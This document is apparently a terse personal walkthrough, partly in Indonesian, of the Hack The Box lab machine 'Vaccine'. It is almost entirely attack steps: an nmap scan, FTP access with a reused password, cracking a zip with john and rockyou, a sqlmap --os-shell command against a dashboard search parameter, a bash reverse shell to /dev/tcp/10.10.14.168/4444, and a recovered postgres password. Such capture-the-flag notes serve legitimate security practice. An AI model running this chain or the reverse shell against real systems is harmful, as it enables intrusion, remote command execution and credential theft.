# vaccine

nmap -A -T4 -p- -oN nmap 10.10.10.46

port ftp

login use as password mc@F1l3ZilL4 <- from before challange

in ftp use get backup.zip command

pake john dengan command zip2john backup.zip > backup.hash

john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt

password buat zip : 741852963

dapet credential 
```
admin
qwerty789
```

dapat shell dengan command `sqlmap -u http://10.10.10.46/dashboard.php?search=tes --cookie 'PHPSESSID=073ggj0s9c3154k9og0l6p2osg' --os-shell`

ketika sudah dapat shell dari sqlmap kita pake reverse shell dari bash yaitu `bash -c 'bash -i >& /dev/tcp/10.10.14.168/4444 0>&1'`

get new password for db `host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!`

